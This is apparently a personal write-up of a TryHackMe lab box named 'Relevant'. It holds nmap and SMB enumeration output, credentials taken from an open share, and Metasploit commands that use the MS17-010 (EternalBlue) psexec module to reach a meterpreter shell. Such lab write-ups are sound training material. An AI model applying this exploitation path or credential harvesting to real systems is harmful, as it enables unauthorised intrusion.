#Windows  #Metasploit #THM  #EnumerateSmb #EthernalBlue

#### Nmap

```bash
80/tcp   open  http          Microsoft IIS httpd 10.0
   | http-methods: 
   |_  Potentially risky methods: TRACE
   |_http-title: IIS Windows Server
   135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
   | ssl-cert: Subject: commonName=Relevant
   | Not valid before: 2021-12-19T18:10:10
   |_Not valid after:  2022-06-20T18:10:10
   | rdp-ntlm-info: 
   |   Target_Name: RELEVANT
   |   NetBIOS_Domain_Name: RELEVANT
   |   NetBIOS_Computer_Name: RELEVANT
   |   DNS_Domain_Name: Relevant
   |   DNS_Computer_Name: Relevant
   |   Product_Version: 10.0.14393
   |_  System_Time: 2021-12-20T18:22:23+00:00
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
   | smb2-security-mode: 
   |   3.1.1: 
   |_    Message signing enabled but not required
   | smb-os-discovery: 
   |   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
   |   Computer name: Relevant
   |   NetBIOS computer name: RELEVANT\x00
   |   Workgroup: WORKGROUP\x00
   |_  System time: 2021-12-20T10:22:27-08:00
   |_clock-skew: mean: 2h00m01s, deviation: 4h00m02s, median: 0s
   | smb-security-mode: 
   |   account_used: guest
   |   authentication_level: user
   |   challenge_response: supported
   |_  message_signing: disabled (dangerous, but default)
   | smb2-time: 
   |   date: 2021-12-20T18:22:25
   |_  start_date: 2021-12-20T18:10:10


OS: Microsoft Windows Server 2012 R2 
Host script results:
   | smb-vuln-ms17-010: # ETHERNAL BLUE 
   |   VULNERABLE:
   |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) 
   |     State: VULNERABLE
   |     IDs:  CVE:CVE-2017-0143
   |     Risk factor: HIGH
   |       A critical remote code execution vulnerability exists in Microsoft SMBv1
   |        servers (ms17-010).     
```

## SMB

#### Enumerate

```bash
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.101.234\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.101.234\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.101.234\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.101.234\nt4wrksv: 
|     warning: Couldn't get details for share: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
|     Anonymous access: <none>
|_    Current user access: READ/WRITE
```

##### nt4wrksv Share Anonymous login
* password.txt
	* Bob - !P@\$\$W0rD!123
	* Bill - Juw4nnaM4n420696969!\$\$\$

##### Exploit Ethernal Blue

```bash
msf6 > use windows/smb/ms17_010_psexec
msf6 > set SHARE ADMIN$
meterpreter > 
```